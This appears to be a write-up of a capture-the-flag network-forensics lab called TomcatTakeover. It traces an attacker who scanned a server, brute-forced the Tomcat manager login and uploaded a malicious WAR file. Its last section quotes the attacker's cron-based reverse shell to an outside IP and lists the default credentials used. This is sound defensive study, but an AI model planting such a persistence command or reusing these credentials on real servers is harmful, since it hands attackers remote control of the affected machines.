### **PCAP File**

- **Password**: `cyberdefender`
- **File**: ![[135-TomcatTakeover.zip]]
### Q1: Identify the Source IP Address

- **Suspicious IP Address**:  
    The series of requests indicate scanning behavior, leading to the identification of the source IP responsible for initiating these requests.  
    ![[{0DD0AE2B-578C-4537-B6F6-27A13025B128}.png]]


### Q2: City of the Attacker

- **Attacker's City**:  
    Based on the identified IP address, use a reverse IP search (e.g., AbuseIPDB) to ascertain the city from which the attack originated.
    ![[{681177B9-976D-4B71-A0B2-1F8C8068C36E}.png]]

### Q3: Access to Web Server Admin Panel

- **Open Ports**:  
    The attacker discovered multiple open ports. The following ports provide access to the web server admin panel:
    - **Port 8080**

### Q4: Enumeration Tools Used

- **Tools Identified**:  
    The attacker used the following tool for directory enumeration:
    - **Gobuster**  
        ![[{79446939-368C-4F5D-B44B-30B45E9C2E80}.png]]

### Q5: Admin Panel Directory Discovered

- **Admin Directory**:  
    The attacker was able to uncover the following specific directory associated with the admin panel:
    - **/manager**
    - **/admin**  
        ![[{78CAB62A-95EF-49DD-8928-D8B3E57CD8D0}.png]]

### Q6: Brute-Force Login Credentials

- **Successful Credentials**:  
    After brute-forcing the login credentials, the attacker successfully used the following combination for authorization:
    - **Username**: admin
    - **Password**: tomcat
        ![[{ED9E0365-6EA7-4E72-8669-7DA3A6C59217}.png]]

### Q7: Name of Malicious File Uploaded

- **Malicious File Name**:  
    The attacker attempted to upload a file to establish a reverse shell:
    - **File Name**: `JXQOZ.war`  
        ![[{8967AAD6-733F-4468-8EA3-C6E7596E1560}.png]]

### Q8: Command for Persistence

- **Command Executed**:  
    The attacker scheduled a command to ensure persistence on the compromised machine:
    
     ![[{809D02CE-8521-4CF4-A2D7-1D434F01E9A4}.png]]

```bash
whoami
root
cd /tmp
pwd
/tmp
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'" > cron
crontab -i cron
crontab -l
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
```
